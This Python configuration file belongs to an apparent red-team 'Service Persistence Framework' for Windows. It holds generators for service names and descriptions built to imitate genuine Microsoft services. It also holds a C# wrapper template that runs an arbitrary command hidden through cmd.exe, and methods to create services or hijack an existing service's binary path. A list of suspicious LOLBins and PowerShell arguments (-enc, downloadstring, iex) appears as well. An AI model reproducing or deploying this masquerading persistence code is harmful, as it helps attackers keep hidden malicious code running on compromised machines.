"""
Configuration and constants for Service Persistence Framework
"""

# Service name components for generation
SERVICE_NAME_COMPONENTS = {
    'prefixes': [
        'Windows', 'Microsoft', 'System', 'Security', 
        'Network', 'Update', 'Device', 'Application'
    ],
    'middles': [
        'Update', 'Telemetry', 'Diagnostic', 'Maintenance',
        'Monitor', 'Manager', 'Controller', 'Handler',
        'Runtime', 'Host', 'Provider'
    ],
    'suffixes': [
        'Service', 'Manager', 'Agent', 'Handler',
        'Monitor', 'Controller', 'Host', 'Provider'
    ]
}

# Service start types
SERVICE_START_TYPES = {
    'auto': {
        'name': 'Automatic',
        'value': 'auto',
        'description': 'Starts automatically at boot'
    },
    'delayed': {
        'name': 'Automatic (Delayed Start)',
        'value': 'delayed-auto',
        'description': 'Starts automatically with delay'
    },
    'demand': {
        'name': 'Manual',
        'value': 'demand',
        'description': 'Starts manually'
    },
    'disabled': {
        'name': 'Disabled',
        'value': 'disabled',
        'description': 'Service disabled'
    }
}

# Default service descriptions
DEFAULT_DESCRIPTIONS = [
    "Provides system maintenance and monitoring",
    "Enables security update delivery",
    "Maintains system performance and diagnostics",
    "Provides network connectivity management",
    "Supports application compatibility and updates",
    "Enables telemetry and diagnostic data collection",
    "Manages system configuration and settings"
]

# Suspicious service indicators
SUSPICIOUS_INDICATORS = {
    'paths': [
        'users\\public',
        'appdata\\local\\temp',
        'appdata\\roaming',
        '\\temp\\',
        '\\downloads\\',
        'programdata'
    ],
    'executables': [
        'powershell.exe',
        'cmd.exe',
        'rundll32.exe',
        'regsvr32.exe',
        'mshta.exe',
        'wscript.exe',
        'cscript.exe',
        'certutil.exe',
        'bitsadmin.exe'
    ],
    'arguments': [
        '-enc',
        '-encodedcommand',
        '-nop',
        '-noprofile',
        '-windowstyle hidden',
        '-w hidden',
        'downloadstring',
        'downloadfile',
        'invoke-expression',
        'iex'
    ]
}

# C# Service wrapper template
SERVICE_WRAPPER_TEMPLATE = '''using System;
using System.Diagnostics;
using System.ServiceProcess;

namespace ServiceWrapper
{{
    public class {class_name} : ServiceBase
    {{
        private Process process;
        
        public {class_name}()
        {{
            this.ServiceName = "{service_name}";
        }}
        
        protected override void OnStart(string[] args)
        {{
            try
            {{
                process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c {command}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();
            }}
            catch (Exception ex)
            {{
                EventLog.WriteEntry("Application", "Service start error: " + ex.Message, EventLogEntryType.Error);
            }}
        }}
        
        protected override void OnStop()
        {{
            try
            {{
                if (process != null && !process.HasExited)
                {{
                    process.Kill();
                    process.WaitForExit(5000);
                }}
            }}
            catch {{ }}
        }}
        
        static void Main()
        {{
            ServiceBase.Run(new {class_name}());
        }}
    }}
}}
'''

# Common service methods metadata
SERVICE_METHODS = {
    'create': {
        'name': 'Create New Service',
        'description': 'Create a new Windows service',
        'requires_admin': True,
        'requires_service_binary': True
    },
    'wrapper': {
        'name': 'Create with Wrapper',
        'description': 'Create service with C# wrapper for non-service binaries',
        'requires_admin': True,
        'requires_service_binary': False
    },
    'modify': {
        'name': 'Modify Existing Service',
        'description': 'Modify existing service binary path',
        'requires_admin': True,
        'requires_service_binary': True
    }
}

# .NET Framework paths (try multiple versions)
DOTNET_FRAMEWORK_PATHS = [
    r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe',
    r'C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe',
    r'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe',
    r'C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe'
]

# Output paths
OUTPUT_PATHS = {
    'wrapper_source': r'C:\Users\Public\{service_name}.cs',
    'wrapper_binary': r'C:\Users\Public\{service_name}.exe',
    'removal_script': 'remove_service_{service_name}.bat',
    'restore_script': 'restore_service_{service_name}.bat'
}